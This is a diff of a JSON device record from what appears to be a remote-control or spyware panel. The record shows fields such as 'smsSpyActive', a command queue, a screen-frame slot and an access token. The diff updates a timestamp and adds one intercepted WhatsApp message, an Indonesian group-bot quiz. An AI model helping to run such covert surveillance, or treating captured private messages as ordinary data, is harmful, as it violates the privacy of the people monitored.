@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040528780,
+    "lastSeen": 1775040531876,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12123 pesan): ~ Bot",
+        "content": "🎮 FAMILY100\n\nHadiah Apa Yang Tidak Dibungkus\n\n⏳ Jawab dalam 60 detik!\n📌 CARA JAWAB: Balas/Reply pesan ini dengan jawabanmu!\n> gunakan .nyerah untuk menyerah.",
+        "time": "01/04 18:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040532435
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
